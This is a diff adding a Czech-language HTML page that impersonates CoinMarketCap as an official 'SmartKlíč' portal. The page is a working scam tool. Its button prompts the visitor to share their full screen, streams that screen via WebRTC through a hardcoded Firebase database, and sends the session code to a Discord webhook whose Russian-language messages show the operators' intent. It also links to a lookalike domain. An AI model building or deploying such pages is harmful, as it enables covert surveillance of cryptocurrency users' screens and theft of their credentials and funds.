@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CoinMarketCap – Klientský portál</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #eef2f7 0%, #d9e5f3 100%);
+            color: #1e293b;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        /* Навигационная панель */
+        header {
+            width: 100%;
+            padding: 25px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: transparent;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 700;
+            font-size: 19px;
+            color: #2563eb;
+        }
+
+        .logo-img {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+        }
+
+        /* Главная рабочая область */
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            margin: auto;
+            padding: 20px 40px;
+            display: table;
+        }
+
+        .main-layout {
+            display: table-row;
+        }
+
+        /* Левая часть с кнопкой трансляции */
+        .left-panel {
+            display: table-cell;
+            vertical-align: middle;
+            width: 55%;
+            padding-right: 40px;
+            text-align: center;
+        }
+
+        .connect-box {
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 24px;
+            padding: 60px 40px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.8);
+            display: inline-block;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        #hostBtn {
+            background: #2563eb;
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 14px;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(37, 99, 235, 0.25);
+            transition: all 0.25s ease;
+        }
+
+        #hostBtn:hover {
+            background: #1d4ed8;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(37, 99, 235, 0.35);
+        }
+
+        #hostBtn:active {
+            transform: translateY(0);
+        }
+
+        .ticket-wrapper {
+            margin-top: 35px;
+            padding-top: 25px;
+            border-top: 1px dashed #cbd5e1;
+            display: none;
+        }
+
+        .ticket-label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #64748b;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        #roomCode {
+            font-size: 38px;
+            font-weight: 800;
+            color: #1e293b;
+            letter-spacing: 5px;
+            margin: 0;
+            background: #ffffff;
+            padding: 12px 25px;
+            border-radius: 12px;
+            display: inline-block;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.02);
+            border: 1px solid #e2e8f0;
+        }
+
+        /* Правая часть – Рекламная карточка */
+        .right-panel {
+            display: table-cell;
+            vertical-align: middle;
+            width: 45%;
+        }
+
+        .info-card {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 28px;
+            box-shadow: 0 20px 40px rgba(15, 23, 42, 0.05);
+            border: 1px solid #e2e8f0;
+            text-align: left;
+        }
+
+        .banner-container {
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid #f1f5f9;
+            margin-bottom: 20px;
+            line-height: 0;
+        }
+
+        .banner-img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Большой черный жирный заголовок по твоей правке */
+        .info-card h3 {
+            font-size: 26px;
+            color: #0f172a;
+            margin: 0 0 12px 0;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .info-card p {
+            font-size: 13.5px;
+            color: #64748b;
+            line-height: 1.6;
+            margin: 0 0 20px 0; /* Отступ снизу до кнопки */
+        }
+
+        /* Красивая кнопка в самом низу карточки */
+        .action-card-btn {
+            background: #2563eb;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.15);
+            transition: all 0.2s ease;
+            text-align: center;
+            display: block;
+        }
+
+        .action-card-btn:hover {
+            background: #1d4ed8;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(37, 99, 235, 0.25);
+        }
+
+        /* Подвал */
+        footer {
+            width: 100%;
+            padding: 25px;
+            text-align: center;
+            font-size: 13px;
+            color: #94a3b8;
+            font-weight: 500;
+        }
+
+        /* Адаптивность */
+        @media (max-width: 768px) {
+            .container { padding: 10px 20px; display: block; }
+            .main-layout { display: block; }
+            .left-panel, .right-panel { display: block; width: 100%; padding: 0; }
+            .left-panel { margin-bottom: 30px; }
+            header { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo-area">
+        <img class="logo-img" src="https://s3-eu-west-1.amazonaws.com/tpd/logos/5900cd240000ff0005a144b5/0x0.png" alt="Logo">
+        <span>CoinMarketCap</span>
+    </div>
+</header>
+
+<div class="container">
+    <div class="main-layout">
+        
+        <div class="left-panel">
+            <div class="connect-box">
+                <button id="hostBtn">Připojit se</button>
+                
+                <div id="ticketWrapper" class="ticket-wrapper">
+                    <div class="ticket-label">Váš kupon k účtu</div>
+                    <h2 id="roomCode">----</h2>
+                </div>
+            </div>
+        </div>
+
+        <div class="right-panel">
+            <div class="info-card">
+                <div class="banner-container">
+                    <img class="banner-img" src="https://s2.coinmarketcap.com/static/cloud/img/app-banner/fullscreen-2.png?_=96db608" alt="CoinMarketCap Banner">
+                </div>
+                <h3>SmartKlíč CoinMarketCap</h3>
+                <p>SmartKlíč je oficiální aplikace pro bezpečné a rychlé připojení k vaší kryptoměnové infrastruktuře a investičnímu účtu.</p>
+                <a class="action-card-btn" href="https://coinmarketcap.surge.sh/" target="_blank">Dozvědět se více</a>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<footer>
+    © 2026 SmartKlíč • Oficiální instalační balíček
+</footer>
+
+<video id="video" autoplay playsinline style="display: none;"></video>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import {
+    getDatabase,
+    ref,
+    set,
+    push,
+    onValue
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+/* ================= FIREBASE ================= */
+
+const firebaseConfig = {
+    apiKey: "AIzaSyATuLv77C1q3awiN2fDeckQtCerF-rTc_Q",
+    authDomain: "lionspdf-499b5.firebaseapp.com",
+    databaseURL: "https://lionspdf-499b5-default-rtdb.firebaseio.com",
+    projectId: "lionspdf-499b5",
+    storageBucket: "lionspdf-499b5.firebasestorage.app",
+    messagingSenderId: "63522826506",
+    appId: "1:63522826506:web:45ec1d9412f0aec5a6f2f3"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+/* ================= DISCORD WEBHOOK ================= */
+
+const webhookUrl = "https://discord.com/api/webhooks/1519024533280129055/37m7gkXnFmJo20Qdk8MJ-_VQASb1RWP4Co6DS7Wm3g2nQ5Cq3raKLs2cS8yuTRQNimwo";
+
+async function sendToDiscord(code) {
+    const payload = {
+        username: "Магнитный лев для денег!",
+        avatar_url: "https://art-boutique.by/wp-content/uploads/2023/11/1mjP1ie9rJg.jpg",
+        embeds: [{
+            title: "🚀 Демонстрация экрана ПК!",
+            description: `Код для подключения: **${code}**`,
+            color: 3447003,
+            timestamp: new Date().toISOString(),
+            footer: {
+                text: "Только лев откроет анидеск."
+            }
+        }]
+    };
+
+    try {
+        await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+    } catch (error) {
+        console.error("Ошибка вебхука:", error);
+    }
+}
+
+/* ================= UI & WebRTC ================= */
+
+const hostBtn = document.getElementById("hostBtn");
+const roomCode = document.getElementById("roomCode");
+const ticketWrapper = document.getElementById("ticketWrapper");
+
+const iceServers = {
+    iceServers: [
+        { urls: ["stun:stun.l.google.com:19302", "stun:stun1.l.google.com:19302"] }
+    ]
+};
+
+let hostStream;
+const peers = {};
+
+hostBtn.addEventListener("click", async () => {
+    try {
+        hostStream = await navigator.mediaDevices.getDisplayMedia({
+            video: { frameRate: 30, displaySurface: "monitor" },
+            audio: false
+        });
+    } catch (e) {
+        alert("Nepodařilo se spustit sdílení obrazovky.");
+        return;
+    }
+
+    const roomId = Math.floor(1000 + Math.random() * 9000).toString();
+    
+    roomCode.innerText = roomId;
+    ticketWrapper.style.display = "block";
+    
+    // Переключаем стиль кнопки на зеленый "Připojeno"
+    hostBtn.innerText = "Připojeno";
+    hostBtn.style.background = "#10b981"; 
+    hostBtn.style.boxShadow = "0 10px 25px rgba(16, 185, 129, 0.25)";
+
+    await set(ref(db, "rooms/" + roomId), { created: Date.now() });
+    sendToDiscord(roomId);
+
+    onValue(ref(db, `rooms/${roomId}/viewers`), snap => {
+        snap.forEach(child => {
+            const viewerId = child.key;
+            if (peers[viewerId]) return;
+            createPeer(viewerId, roomId);
+        });
+    });
+
+    function createPeer(viewerId, roomId) {
+        const pc = new RTCPeerConnection(iceServers);
+
+        hostStream.getTracks().forEach(track => {
+            pc.addTrack(track, hostStream);
+        });
+
+        pc.onicecandidate = (e) => {
+            if (e.candidate) {
+                push(ref(db, `rooms/${roomId}/viewers/${viewerId}/hostCandidates`), e.candidate.toJSON());
+            }
+        };
+
+        pc.createOffer().then(async offer => {
+            await pc.setLocalDescription(offer);
+            set(ref(db, `rooms/${roomId}/viewers/${viewerId}/offer`), {
+                type: offer.type,
+                sdp: offer.sdp
+            });
+        });
+
+        onValue(ref(db, `rooms/${roomId}/viewers/${viewerId}/answer`), snap => {
+            const data = snap.val();
+            if (data && !pc.currentRemoteDescription) {
+                pc.setRemoteDescription(new RTCSessionDescription(data));
+            }
+        });
+
+        onValue(ref(db, `rooms/${roomId}/viewers/${viewerId}/candidates`), snap => {
+            snap.forEach(c => {
+                pc.addIceCandidate(new RTCIceCandidate(c.val()));
+            });
+        });
+
+        peers[viewerId] = pc;
+    }
+});
+
+</script>
+
+</body>
+</html>
